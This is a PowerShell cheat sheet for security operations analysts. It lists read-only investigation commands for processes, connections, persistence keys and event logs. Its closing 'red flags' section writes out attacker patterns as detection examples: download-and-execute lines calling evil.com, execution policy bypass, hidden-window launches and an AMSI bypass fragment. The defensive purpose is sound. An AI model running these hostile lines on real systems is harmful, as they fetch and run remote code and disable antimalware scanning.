# PowerShell for SOC Analysts

## Investigation Commands

```powershell
# ── SYSTEM INFORMATION ──────────────────────────────────────────────
Get-ComputerInfo                                    # Full system info
Get-Date                                            # Current date/time
(Get-WmiObject win32_operatingsystem).LastBootUpTime # Last reboot time

# ── USER INVESTIGATION ──────────────────────────────────────────────
Get-LocalUser                                       # All local users
Get-LocalGroupMember -Group "Administrators"        # Admin group members
Get-LocalGroup                                      # All local groups
net user username /domain                           # AD user info

# ── PROCESS INVESTIGATION ───────────────────────────────────────────
Get-Process                                         # Running processes
Get-Process | Sort-Object CPU -Descending           # By CPU usage
Get-Process | Where-Object {$_.Path -like "C:\Users\*"} # Processes from user dirs

# Process with network connections
Get-NetTCPConnection | ForEach-Object {
    $proc = Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue
    [PSCustomObject]@{
        LocalPort  = $_.LocalPort
        RemoteAddr = $_.RemoteAddress
        RemotePort = $_.RemotePort
        State      = $_.State
        Process    = $proc.Name
        PID        = $_.OwningProcess
    }
} | Where-Object {$_.State -eq "Established"}

# ── NETWORK INVESTIGATION ───────────────────────────────────────────
Get-NetTCPConnection -State Established             # Active connections
Get-NetTCPConnection -State Listen                  # Listening ports
Test-NetConnection -ComputerName 8.8.8.8 -Port 53  # Test connectivity
Resolve-DnsName evil.example.com                    # DNS lookup

# ── SCHEDULED TASKS ─────────────────────────────────────────────────
Get-ScheduledTask | Where-Object {$_.State -eq "Ready"}
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft\*"} # Non-MS tasks
# Inspect specific task
Get-ScheduledTask -TaskName "SuspiciousTask" | Get-ScheduledTaskInfo

# ── SERVICES ────────────────────────────────────────────────────────
Get-Service | Where-Object {$_.Status -eq "Running"}
Get-WmiObject Win32_Service | Where-Object {$_.StartName -like "*\*"} # Non-SYSTEM services

# ── PERSISTENCE LOCATIONS ───────────────────────────────────────────
# Registry run keys
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"

# Startup folders
Get-ChildItem "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"

# ── EVENT LOG QUERIES ───────────────────────────────────────────────
# Failed logins (last 24h)
Get-WinEvent -FilterHashtable @{
    LogName='Security'; Id=4625;
    StartTime=(Get-Date).AddHours(-24)
} | Select-Object TimeCreated, Message

# New accounts created
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4720}

# PowerShell scriptblock logs
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" |
    Where-Object {$_.Id -eq 4104} |
    Select-Object TimeCreated, Message

# ── FILE INVESTIGATION ──────────────────────────────────────────────
# Recently created files
Get-ChildItem C:\ -Recurse -ErrorAction SilentlyContinue |
    Where-Object {$_.CreationTime -gt (Get-Date).AddDays(-1)}

# File hash
Get-FileHash C:\suspicious.exe -Algorithm SHA256
Get-FileHash C:\suspicious.exe -Algorithm MD5
```

## Red Flags in PowerShell Logs

```powershell
# These patterns in PS logs = investigate immediately

# Encoded command (base64)
powershell.exe -EncodedCommand <base64string>

# Download and execute
IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
Invoke-Expression (Invoke-WebRequest 'http://evil.com/payload').Content

# Bypass execution policy
powershell.exe -ExecutionPolicy Bypass -File malicious.ps1

# Hidden window
powershell.exe -WindowStyle Hidden -Command ...

# Disable AMSI (antimalware scan interface)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
```
